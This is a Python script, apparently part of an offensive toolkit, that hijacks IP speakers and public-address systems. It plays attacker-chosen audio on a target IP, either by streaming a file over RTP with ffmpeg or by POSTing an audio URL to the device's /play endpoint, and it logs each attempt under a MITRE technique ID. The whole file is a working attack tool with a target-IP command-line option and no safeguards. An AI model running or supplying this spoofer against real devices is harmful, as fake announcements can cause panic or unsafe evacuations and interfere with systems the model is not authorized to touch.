#!/usr/bin/env python3
# modules/attacks/speaker_pa_announcement_spoofer.py

import argparse
import subprocess
import os
import json
from datetime import datetime
import time
import requests

LOG_FILE = "results/pa_spoof_log.json"
MITRE_TTP = "T1424"

def log_attack(ip, method, audio_file):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "method": method,
        "audio_file": audio_file,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def stream_rtp(ip, port, audio):
    print(f"[*] Streaming {audio} to RTP speaker at {ip}:{port}...")
    subprocess.Popen([
        "ffmpeg", "-re", "-i", audio,
        "-f", "rtp", f"rtp://{ip}:{port}"
    ])
    log_attack(ip, "RTP", audio)

def inject_http(ip, audio_url):
    print(f"[*] Sending HTTP play request to {ip} for {audio_url}...")
    try:
        requests.post(f"http://{ip}/play", data={"url": audio_url}, timeout=5)
        log_attack(ip, "HTTP", audio_url)
        print("[✓] HTTP PA spoof request sent.")
    except Exception as e:
        print(f"[!] Failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof audio to IP speaker or PA systems")
    parser.add_argument("--ip", required=True, help="Target speaker IP")
    parser.add_argument("--method", choices=["http", "rtp"], default="http", help="Spoofing method")
    parser.add_argument("--port", type=int, default=5004, help="RTP port (if using RTP)")
    parser.add_argument("--audio", help="Audio file to stream (RTP) or URL (HTTP)")
    args = parser.parse_args()

    if args.method == "rtp":
        if not args.audio:
            print("[!] Audio file required for RTP")
        else:
            stream_rtp(args.ip, args.port, args.audio)
    else:
        if not args.audio:
            print("[!] Audio URL required for HTTP")
        else:
            inject_http(args.ip, args.audio)
